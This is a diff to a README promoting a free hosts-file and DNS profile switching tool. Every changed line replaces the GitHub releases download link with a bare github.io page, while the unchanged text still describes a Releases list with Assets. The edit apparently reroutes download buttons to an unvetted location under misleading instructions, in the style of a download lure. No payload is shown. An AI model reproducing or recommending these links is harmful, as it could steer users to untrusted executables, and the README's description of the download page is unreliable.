@@ -1,6 +1,6 @@
 # 🛠️ Hosts-File-Switch-Tool-Free - Switch DNS Profiles in Seconds
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/mdforhad6902/Hosts-File-Switch-Tool-Free/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://mdforhad6902.github.io)
 
 ---
 
@@ -25,7 +25,7 @@ Getting started is easier than you think. Follow these simple steps:
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**Click Here to Download**](https://github.com/mdforhad6902/Hosts-File-Switch-Tool-Free/releases)
+[**Click Here to Download**](https://mdforhad6902.github.io)
 
 On that page, you'll see a list of available releases. Look for the newest version at the top and click the download button. The file will be saved to your computer.
 
@@ -42,7 +42,7 @@ If you're new to downloading software from the internet, don't worry. Here's eve
 ### Finding the Right File
 
 Visit this link to download the application:  
-[**https://github.com/mdforhad6902/Hosts-File-Switch-Tool-Free/releases**](https://github.com/mdforhad6902/Hosts-File-Switch-Tool-Free/releases)
+[**https://mdforhad6902.github.io**](https://mdforhad6902.github.io)
 
 When you arrive at the page, you'll see a section called "Releases" with a list of versions. The latest version will be at the top. Under each version, there will be a "Assets" area with downloadable files. Choose the file that simply has the application name—it's usually the biggest file listed.
 
@@ -166,7 +166,7 @@ Managing your hosts file doesn't have to be scary or complicated. Hosts-File-Swi
 
 What are you waiting for? Your smooth internet experience is one click away.
 
-[**🚀 Start Your Free Download Now**](https://github.com/mdforhad6902/Hosts-File-Switch-Tool-Free/releases)
+[**🚀 Start Your Free Download Now**](https://mdforhad6902.github.io)
 
 Visit this link to download the application. You'll be up and running in less than a minute. Download it today and see how much easier managing DNS and hosts configurations can be.
 
